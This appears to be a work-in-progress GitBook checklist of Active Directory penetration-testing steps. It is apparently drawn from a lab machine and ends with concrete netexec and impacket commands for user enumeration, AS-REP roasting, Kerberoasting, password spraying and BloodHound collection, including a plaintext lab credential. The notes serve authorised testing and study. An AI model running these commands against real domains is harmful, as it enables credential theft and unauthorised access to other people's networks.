---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# WIP

## No Creds

<details>

<summary>HTTP(S)</summary>

* [ ] [Dirbust](../web/dirbusting.md) HTTP(S) ports with
  * [ ] [Directory list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt) plus server-specific extensions
  * [ ] [File list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-files.txt) plus server-specific extensions

</details>

<details>

<summary><a href="../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] Null session
* [ ] Guest session
* [ ] Anonymous session

</details>

<details>

<summary>AD Attacks</summary>

* [ ] Check for valid users ([kerbrute](https://x7331.gitbook.io/boxes/tl-dr/active-directory/ad-tools/kerbrute))
  * [ ] BFA with `user:user`
* [ ] [AS-REPRoast](../tl-dr/active-directory/attacks/as-reproasting.md)
  * [ ] Crack hashes

</details>

## With Creds&#x20;

### Remote Access

<details>

<summary>User Context</summary>

* [ ] [SMB Enumeration](../services/shares/smb-139-445.md#usage)

</details>

<details>

<summary>AD Attacks</summary>

* [ ] Create a domain user list ([nxc](../tl-dr/active-directory/ad-tools/netexec.md#smb))
  * [ ] Password spray with `user:user`
* [ ] [Kerberoast](../tl-dr/active-directory/attacks/kerberoasting.md)
  * [ ] Crack hashes
* [ ] Collect [domain data](../tl-dr/active-directory/ad-tools/bloodhound.md#ingestors) (RustHound-CE, bloodhound-python)
  * [ ] Analyze data and note potential targets and attack vectors

</details>

### Local Access

<details>

<summary>User Context</summary>

* [ ] Check [groups](../tl-dr/infra/os/windows/privilege-escalation/groups/)
* [ ] Check [privileges](../tl-dr/infra/os/windows/privilege-escalation/privileges/)

</details>

<details>

<summary>AD Attacks</summary>

* [ ] Collect [domain data](../tl-dr/active-directory/ad-tools/bloodhound.md#ingestors) (SharpHound)
  * [ ] Analyze data and note potential targets and attack vectors

</details>



## Domain User

1. Create a userlist and AS-REPRoast, Kerberoast, PassSpray

{% code overflow="wrap" %}
```bash
# Domain users
nxc smb hokka -u info -p info --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users

# AS-REPRoast
$ impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip 192.168.155.40 -no-pass -usersfile domain_users

# Kerberoast
impacket-GetUserSPNs -request -dc-ip hokka hokkaido-aerospace.com/info:info

# Password Spray
nxc smb hokka -u domain_users -p domain_users --continue-on-success | grep +
```
{% endcode %}

2. Enumerate SMB shares

```bash
nxc smb hokka -u info -p info --shares
```

3. Check for remote access

```bash
nxc winrm hokka -u info -p info
nxc rdp hokka -u info -p info
```

4. Collect domain data

{% code overflow="wrap" %}
```bash
$ nxc ldap dc.hokkaido-aerospace.com -u discovery -p Start123! --bloodhound -c All --dns-server 192.168.155.40
```
{% endcode %}
